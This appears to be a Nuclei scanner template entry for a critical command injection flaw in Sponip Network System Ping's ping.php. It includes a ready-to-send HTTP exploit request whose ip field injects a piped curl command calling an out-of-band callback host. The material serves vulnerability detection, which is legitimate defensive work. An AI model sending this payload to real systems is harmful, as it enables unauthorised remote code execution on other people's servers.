# Nuclei Template: Sponip Network System Ping - Remote Code Execution
**Template ID:** sponip-network-system-ping-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`sponip-network-system-ping-rce.yaml`)

## Vulnerability Information & PoC

## Description
Sponip Network System Ping is susceptible to remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /php/ping.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

sondata[ip]=a|curl {{interactsh-url}}&jsondata[type]=1
```

## References
- https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486018&idx=1&sn=d744907475a4ea9ebeb26338c735e3e9
